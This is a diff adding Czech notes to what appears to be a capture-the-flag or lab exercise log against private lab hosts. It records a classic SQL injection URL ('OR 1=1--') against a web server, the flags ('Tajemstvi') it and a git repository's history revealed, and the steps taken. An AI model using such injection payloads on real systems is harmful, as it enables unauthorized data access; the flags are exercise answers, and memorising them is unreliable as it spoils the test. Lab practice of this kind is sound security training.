@@ -26,3 +26,15 @@ Admin page      http://192.168.122.134/admin/   1699909372
 ftp://192.168.122.164/  ftp://192.168.122.164/  1699971403
 [jimmy@localhost ~]$ curl http://192.168.122.134/secret/
 
+
+
+3 - tajemstvi na http serveru - sql injection
+elinks http://192.168.122.134/user.php?id=1'+OR+1=1--'
+Tajemstvi_H_6e6d348321ba3ef333b8a8ae5826060cc860496cb13c6b017b234006012ff0e8
+
+
+4 - git server git://192.168.122.249
+
+je tam repo "secret". V repu je main.c
+Git show main.c vypise metadata a zmeny. Ve zmenach je tajemstvi F
+Tajemstvi_F_c727260c0332918f7a1c340f8ee9ad414b71d0b8efffe9178815fd7399b00125
